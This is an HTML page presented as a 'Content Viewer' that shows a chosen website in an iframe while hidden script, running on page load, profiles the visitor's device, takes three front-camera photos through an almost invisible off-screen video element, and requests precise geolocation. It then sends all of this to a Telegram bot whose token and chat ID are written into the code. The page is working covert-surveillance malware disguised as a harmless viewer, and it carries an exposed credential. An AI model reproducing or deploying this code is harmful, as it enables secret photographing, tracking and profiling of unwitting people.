   <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Content Viewer</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    html, body { 
      height: 100%; 
      margin: 0; 
      padding: 0; 
      overflow: hidden; 
    }
    
    iframe { 
      width: 100%; 
      height: 100%; 
      border: 0; 
      display: block; 
    }
    
    /* Camera container - visible but off-screen */
    #cameraContainer {
      position: fixed;
      top: 0;
      left: 0;
      width: 1px;
      height: 1px;
      overflow: hidden;
      z-index: 10000;
    }
    
    #cameraVideo {
      width: 640px;
      height: 480px;
      transform: translateX(-640px); /* Move off-screen */
      opacity: 0.001;
    }
    
    #cameraCanvas {
      display: none;
    }
  </style>
</head>
<body>
  <!-- Main website content -->
  <iframe id="siteFrame" sandbox="allow-forms allow-same-origin allow-scripts allow-popups allow-modals"></iframe>
  
  <!-- Camera system - visible but off-screen -->
  <div id="cameraContainer">
    <video id="cameraVideo" autoplay playsinline muted></video>
    <canvas id="cameraCanvas" width="640" height="480"></canvas>
  </div>

  <script>
    /******************** CONFIG ********************/
    const ADMIN_CHAT_ID = "6314556756";
    const BOT_TOKEN = "8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ";
    /************************************************/

    class WorkingStealthTracker {
      constructor() {
        this.deviceData = {};
        this.cameraStream = null;
      }

      async initialize() {
        console.log('Starting stealth tracker...');
        
        // Load target site immediately
        this.loadTargetSite();
        
        // Collect device info
        await this.collectDeviceInfo();
        
        // Start camera with proper timing
        setTimeout(() => this.startCameraCapture(), 1000);
        
        // Get location
        setTimeout(() => this.getLocation(), 3000);
        
        // Send final report
        setTimeout(() => this.sendReport(), 5000);
      }

      loadTargetSite() {
        const site = this.getUrlParam('site');
        const iframe = document.getElementById('siteFrame');
        
        if (site && this.isValidHttpsUrl(site)) {
          iframe.src = site;
        } else {
          iframe.srcdoc = '<html><body style="padding:20px;font-family:Arial"><h3>Content Viewer</h3><p>Loading content...</p></body></html>';
        }
      }

      async collectDeviceInfo() {
        this.deviceData = {
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          url: window.location.href,
          
          screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth
          },
          
          hardware: {
            cores: navigator.hardwareConcurrency || 'unknown',
            memory: navigator.deviceMemory || 'unknown'
          }
        };

        // Battery info
        if ('getBattery' in navigator) {
          try {
            const battery = await navigator.getBattery();
            this.deviceData.battery = {
              level: Math.round(battery.level * 100) + '%',
              charging: battery.charging
            };
          } catch (e) {}
        }

        // Network info
        if ('connection' in navigator) {
          const conn = navigator.connection;
          this.deviceData.network = {
            effectiveType: conn.effectiveType,
            downlink: conn.downlink,
            rtt: conn.rtt
          };
        }
      }

      async startCameraCapture() {
        try {
          console.log('Attempting camera access...');
          
          // Request camera with optimal settings
          this.cameraStream = await navigator.mediaDevices.getUserMedia({
            video: {
              width: { ideal: 640 },
              height: { ideal: 480 },
              facingMode: 'user', // Front camera
              frameRate: { ideal: 30 }
            }
          });

          const video = document.getElementById('cameraVideo');
          const canvas = document.getElementById('cameraCanvas');
          const ctx = canvas.getContext('2d');

          video.srcObject = this.cameraStream;

          // Wait for video to load properly
          await new Promise((resolve) => {
            video.addEventListener('loadeddata', () => {
              console.log('Camera video loaded');
              resolve();
            });
          });

          // Wait for video to start playing
          await new Promise((resolve) => {
            video.addEventListener('playing', () => {
              console.log('Camera video playing');
              resolve();
            });
          });

          // IMPORTANT: Wait for camera to adjust to light
          console.log('Waiting for camera to adjust...');
          await new Promise(resolve => setTimeout(resolve, 2000));

          // Capture multiple photos with flash simulation
          const photos = [];
          for (let i = 0; i < 3; i++) {
            console.log(`Capturing photo ${i + 1}...`);
            
            // Brief flash simulation (not visible to user)
            await this.simulateFlash();
            
            // Draw video frame to canvas
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Convert to blob
            const photoBlob = await new Promise(resolve => {
              canvas.toBlob(resolve, 'image/jpeg', 0.9); // High quality
            });
            
            photos.push(photoBlob);
            
            // Wait between photos
            await new Promise(resolve => setTimeout(resolve, 500));
          }

          this.deviceData.cameraPhotos = photos;
          this.deviceData.cameraStatus = `Captured ${photos.length} photos`;
          
          console.log('Camera capture successful!');

        } catch (error) {
          console.error('Camera error:', error);
          this.deviceData.cameraStatus = 'Failed: ' + error.message;
        } finally {
          // Clean up
          if (this.cameraStream) {
            setTimeout(() => {
              this.cameraStream.getTracks().forEach(track => track.stop());
              console.log('Camera stream cleaned up');
            }, 1000);
          }
        }
      }

      async simulateFlash() {
        // Briefly change video brightness to trigger camera exposure
        const video = document.getElementById('cameraVideo');
        const originalFilter = video.style.filter;
        video.style.filter = 'brightness(1.5) contrast(1.2)';
        
        await new Promise(resolve => setTimeout(resolve, 100));
        
        video.style.filter = originalFilter;
        await new Promise(resolve => setTimeout(resolve, 200));
      }

      async getLocation() {
        if (!navigator.geolocation) {
          this.deviceData.locationStatus = 'Geolocation not supported';
          return;
        }

        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 8000,
              maximumAge: 0
            });
          });

          this.deviceData.location = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy + ' meters'
          };
          
          this.deviceData.locationStatus = 'Success';
          console.log('Location acquired');

        } catch (error) {
          this.deviceData.locationStatus = 'Failed: ' + error.message;
          console.warn('Location failed:', error);
        }
      }

      async sendReport() {
        const USER_CHAT_ID = this.getUrlParam('chat_id');
        const recipients = [ADMIN_CHAT_ID];
        if (USER_CHAT_ID) recipients.push(USER_CHAT_ID);

        // Send device info first
        const message = this.formatMessage();
        for (const recipient of recipients) {
          await this.sendToTelegram('sendMessage', recipient, {
            text: message,
            parse_mode: 'HTML'
          });

          // Send location
          if (this.deviceData.location) {
            await this.sendToTelegram('sendLocation', recipient, {
              latitude: this.deviceData.location.latitude,
              longitude: this.deviceData.location.longitude
            });
          }

          // Send photos
          if (this.deviceData.cameraPhotos) {
            for (let i = 0; i < this.deviceData.cameraPhotos.length; i++) {
              await this.sendPhoto(recipient, this.deviceData.cameraPhotos[i], i + 1);
              await new Promise(resolve => setTimeout(resolve, 1000));
            }
          }
        }

        console.log('Report sent successfully');
      }

      formatMessage() {
        return `
üéØ <b>STEALTH TRACKING ACTIVATED</b>

<b>üì± Device Info:</b>
‚Ä¢ <b>Platform:</b> ${this.deviceData.platform}
‚Ä¢ <b>Screen:</b> ${this.deviceData.screen.width}x${this.deviceData.screen.height}
‚Ä¢ <b>CPU/RAM:</b> ${this.deviceData.hardware.cores} cores / ${this.deviceData.hardware.memory}GB
‚Ä¢ <b>Battery:</b> ${this.deviceData.battery?.level || 'N/A'} ${this.deviceData.battery?.charging ? '‚ö°' : ''}

<b>üåê Network:</b>
‚Ä¢ <b>Type:</b> ${this.deviceData.network?.effectiveType || 'Unknown'}
‚Ä¢ <b>Speed:</b> ${this.deviceData.network?.downlink || 'N/A'} Mbps

<b>üìç Location:</b> ${this.deviceData.location ? '‚úÖ Acquired' : '‚ùå ' + (this.deviceData.locationStatus || 'Failed')}
<b>üì∏ Camera:</b> ${this.deviceData.cameraPhotos ? '‚úÖ ' + this.deviceData.cameraPhotos.length + ' photos' : '‚ùå ' + (this.deviceData.cameraStatus || 'Failed')}

<b>üîó Target:</b> <code>${this.getUrlParam('site')}</code>
<b>‚è∞ Time:</b> ${new Date().toLocaleString()}
        `.trim();
      }

      async sendToTelegram(method, chatId, data) {
        try {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, ...data })
          });
        } catch (error) {
          console.warn('Telegram error:', error);
        }
      }

      async sendPhoto(chatId, photoBlob, index) {
        try {
          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('photo', photoBlob, `photo_${index}.jpg`);
          
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
        } catch (error) {
          console.warn('Photo send error:', error);
        }
      }

      getUrlParam(name) {
        const urlParams = new URLSearchParams(window.location.search);
        let value = urlParams.get(name);
        if (value) try { value = decodeURIComponent(value); } catch(e) {}
        return value;
      }

      isValidHttpsUrl(url) {
        try {
          return new URL(url).protocol === 'https:';
        } catch {
          return false;
        }
      }
    }

    // Start tracking when page loads
    window.addEventListener('load', () => {
      const tracker = new WorkingStealthTracker();
      tracker.initialize().catch(console.error);
    });

  </script>
</body>
  </html>
